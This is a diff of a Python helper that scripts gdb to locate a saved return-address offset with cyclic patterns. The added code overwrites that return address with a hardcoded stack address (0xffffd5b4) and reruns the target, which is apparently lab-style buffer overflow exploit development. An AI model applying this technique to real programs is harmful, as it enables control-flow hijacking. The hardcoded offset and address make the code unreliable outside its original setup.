@@ -49,8 +49,8 @@ def locate_ra(pattern, target):
 
     output, _ = gdb_proc.communicate()
 
-    print(output)
-    print(pattern)
+    # print(output)
+    # print(pattern)
     
     eip_value = None
     for line in output.splitlines():
@@ -79,7 +79,6 @@ def locate_ra3(pattern, target):
     #when I send commands from a script to gdb, 4 whitespaces (0x20202020) are added in the beginning of the buffer and it messes up the ra offset calculation!!!
     commands = f"""
     set pagination off
-    set disable-randomization off
     r c
     {pattern.decode('latin-1')}
     """
@@ -116,8 +115,58 @@ def locate_ra3(pattern, target):
 
     # print(eip_value)
 
-    offset = cyclic_find(int(eip_value, 16))
-    # print(f"offset: {offset}")
+    offset = cyclic_find(0x66616166)
+    address = struct.pack("<I", 0xffffd5b4)
+    new_pattern = pattern[:offset] + address + pattern[offset + 4:]
+
+
+    #now run again with the new pattern
+
+    gdb_proc = subprocess.Popen(
+        [f"gdb -q {target}"], 
+        stdin=subprocess.PIPE, 
+        stdout=subprocess.PIPE, 
+        stderr=subprocess.PIPE, 
+        shell=True, 
+        text=True
+    )
+
+    #send the pattern to the gdb target proc from both the arguments and stdin 
+    #when I send commands from a script to gdb, 4 whitespaces (0x20202020) are added in the beginning of the buffer and it messes up the ra offset calculation!!!
+    commands = f"""
+    set pagination off
+    r c
+    {new_pattern.decode('latin-1')}
+    """
+
+    gdb_proc.stdin.write(commands)
+    gdb_proc.stdin.flush()
+
+    while True:
+        output = gdb_proc.stdout.readline()
+        # print(output)
+        if "Program received signal SIGSEGV" in output:
+            break
+
+    gdb_proc.stdin.write("info frame\n")
+    gdb_proc.stdin.flush()
+
+
+    gdb_proc.stdin.write("info registers\n")
+    gdb_proc.stdin.flush()
+
+    gdb_proc.stdin.write("bt\n")
+    gdb_proc.stdin.flush()
+
+    gdb_proc.stdin.write("q\n")
+    gdb_proc.stdin.write("y\n")
+    gdb_proc.stdin.flush()
+
+    output, _ = gdb_proc.communicate()
+
+    print(output)
+
+
     return offset
 
 def locate_ra2(pattern, target):
